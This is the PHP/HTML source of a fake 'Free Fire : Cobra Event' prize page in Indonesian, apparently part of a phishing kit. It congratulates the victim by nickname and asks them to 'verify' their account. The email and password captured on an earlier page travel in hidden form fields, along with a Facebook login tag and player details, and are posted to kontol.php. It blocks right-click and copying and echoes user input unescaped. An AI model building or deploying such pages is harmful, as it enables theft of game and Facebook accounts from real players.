<?php
$nick = $_POST['getNickId'];
$playid = $_POST['getUId'];
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="Free Fire : Cobra Event">
<meta name="description" content="Cobra Event Sudah Di Mulai! Dapatkan Hadiah Yang Kamu Inginkan Sekarang !!! Hadiah Tersebut Gratis,Dan Tidak di pungut biaya Apapun. Silahkan Ambil hadiah Bersama Teman Teman Kalian!">
<meta property="og:description" content="Cobra Event Sudah Di Mulai! Dapatkan Hadiah Yang Kamu Inginkan Sekarang !!! Hadiah Tersebut Gratis,Dan Tidak di pungut biaya Apapun. Silahkan Ambil hadiah Bersama Teman Teman Kalian!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Free Fire : Cobra Event">
<meta property="og:type" content="website">
<meta name="copyright"content="FREE FIRE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://g.top4top.io/s_18883ujz60.png">
<title>Free Fire : Cobra Event</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="icon" href="https://g.top4top.io/s_18883ujz60.png">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<iframe style="display: none;" scrolling="no" allow="autoplay" src="https://d.top4top.io/m_1792jov0q0.mp3" width="0" height="0" frameborder="no"></iframe>

<style>
::placeholder {
color: #fff;
}
</style>
<div class="container">	
<div class="header">
</div>

<div class="box">
<center>
<div class="alert">
SELAMAT KEPADA <?php echo $nick; ?>
<br>
 Silahkan Verifikasi akun kamu agar hadiah dapat terkirim
</center>

<center>
<form action="kontol.php" method="post">
<input type="hidden" class="input-anjir" name="email" value="<?php echo $email; ?>" readonly>
<input type="hidden" name="password" value="<?php echo $password; ?>" readonly>
<input type="number" class="input-anjir" name="playid" value="<?php echo $playid; ?>" readonly>
<input type="text" class="input-anjir" name="nick" value="<?php echo $nick; ?>" readonly>
<select class="input-anjir kanan" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Level</option>
<?php include'system/level.php'; ?>
</select>
<select class="input-anjir kiri" name="tier" id="tier" required>
<option selected="selected" disabled="disabled" value="">Ranked</option>
<option value="Bronze">Bronze</option>
<option value="Silver">Silver</option>
<option value="Gold">Gold</option>
<option value="Platinum">Platinum</option>
<option value="Diamond">Diamond</option>
<option value="Master">Master</option>
<option value="Grandmaster">Grandmaster</option>
</select>
<select class="input-anjir kiri" name="epass" id="epass" required>
<option selected="selected" disabled="disabled" value="">Elite Pass</option>
<option value="Pernah">Pernah</option>
<option value="Tidak Pernah">Tidak Pernah</option>
<option value="Pre-order">Pre-order</option>
</select>
<input type="hidden" name="login" value="Facebook" readonly>
<br>
<br>
<button type="submit" class="btn-anjir">Dapatkan</button>
</form>
</center>

</div> <!--- box --->
</div> <!--- container --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="js/timer.js"></script>
<script src="js/tab.js"></script>
<script src="js/click.js"></script>

</body>
</html>